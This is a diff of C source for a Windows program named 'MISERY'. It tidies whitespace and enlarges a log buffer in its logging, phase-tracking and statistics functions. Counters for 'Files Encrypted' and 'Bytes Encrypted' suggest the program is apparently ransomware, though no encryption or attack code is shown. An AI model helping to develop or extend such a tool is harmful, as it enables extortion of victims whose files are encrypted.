@@ -35,20 +35,20 @@ static const char *LogLevelToString(MISERY_LOG_LEVEL level) {
 
 void MiseryLog(MISERY_LOG_LEVEL level, const char *fmt, ...) {
     if (!fmt) return;
-    
+
     GetSystemTime(&g_misery_ctx.currentTime);
-    
+
     char buffer[2048];
     va_list args;
     va_start(args, fmt);
-    
+
     int written = vsnprintf(buffer, sizeof(buffer) - 1, fmt, args);
     va_end(args);
-    
+
     if (written <= 0) return;
     buffer[written] = '\0';
-    
-    char fullMsg[2048];
+
+    char fullMsg[4096];
     snprintf(fullMsg, sizeof(fullMsg),
         "[%02d:%02d:%02d] %s [%s] %s\n",
         g_misery_ctx.currentTime.wHour,
@@ -57,9 +57,9 @@ void MiseryLog(MISERY_LOG_LEVEL level, const char *fmt, ...) {
         LogLevelToString(level),
         PhaseToString(g_misery_ctx.currentPhase),
         buffer);
-    
+
     printf("%s", fullMsg);
-    
+
     if (g_misery_ctx.hLogFile && g_misery_ctx.hLogFile != INVALID_HANDLE_VALUE) {
         DWORD written;
         WriteFile(g_misery_ctx.hLogFile, fullMsg, strlen(fullMsg), &written, NULL);
@@ -71,7 +71,7 @@ bool MiseryPhaseTransition(MISERY_PHASE newPhase, bool success) {
         MiseryLog(MISERY_LOG_ERROR, "Invalid phase transition: %d", newPhase);
         return false;
     }
-    
+
     if (success) {
         g_misery_ctx.phaseSuccess[g_misery_ctx.currentPhase] = true;
         MiseryLog(MISERY_LOG_INFO, "Phase [%s] completed successfully",
@@ -81,13 +81,13 @@ bool MiseryPhaseTransition(MISERY_PHASE newPhase, bool success) {
         MiseryLog(MISERY_LOG_WARN, "Phase [%s] encountered issues",
             PhaseToString(g_misery_ctx.currentPhase));
     }
-    
+
     g_misery_ctx.lastPhase = g_misery_ctx.currentPhase;
     g_misery_ctx.currentPhase = newPhase;
-    
+
     MiseryLog(MISERY_LOG_INFO, "Transitioning to phase [%s]",
         PhaseToString(newPhase));
-    
+
     return true;
 }
 
@@ -95,14 +95,14 @@ void MiseryReportStats(void) {
     MiseryLog(MISERY_LOG_INFO, "=== EXECUTION STATISTICS ===");
     MiseryLog(MISERY_LOG_INFO, "Version: %s (Built: %s)", MISERY_VERSION, MISERY_BUILD_DATE);
     MiseryLog(MISERY_LOG_INFO, "Execution Time: %lu ms", g_misery_ctx.executionTimeMs);
-    MiseryLog(MISERY_LOG_INFO, "Files Encrypted: %lu / %lu", 
-        g_misery_ctx.filesEncrypted, 
+    MiseryLog(MISERY_LOG_INFO, "Files Encrypted: %lu / %lu",
+        g_misery_ctx.filesEncrypted,
         g_misery_ctx.filesEncrypted + g_misery_ctx.filesFailed);
     MiseryLog(MISERY_LOG_INFO, "Bytes Encrypted: %llu", g_misery_ctx.bytesEncrypted);
-    
+
     printf("\n[PHASE COMPLETION REPORT]\n");
     for (int i = 0; i < PHASE_ERROR; i++) {
-        printf("  %s: %s\n", PhaseToString(i), 
+        printf("  %s: %s\n", PhaseToString(i),
             g_misery_ctx.phaseSuccess[i] ? "✓ SUCCESS" : "✗ FAILED");
     }
 }
@@ -113,14 +113,14 @@ bool MiseryInitContext(void) {
     g_misery_ctx.filesEncrypted = 0;
     g_misery_ctx.filesFailed = 0;
     g_misery_ctx.bytesEncrypted = 0;
-    
+
     MiseryLog(MISERY_LOG_INFO, "=== MISERY v%s INITIALIZATION ===", MISERY_VERSION);
     return true;
 }
 
 void MiseryCleanupContext(void) {
     MiseryReportStats();
-    
+
     if (g_misery_ctx.hLogFile && g_misery_ctx.hLogFile != INVALID_HANDLE_VALUE) {
         CloseHandle(g_misery_ctx.hLogFile);
         g_misery_ctx.hLogFile = INVALID_HANDLE_VALUE;
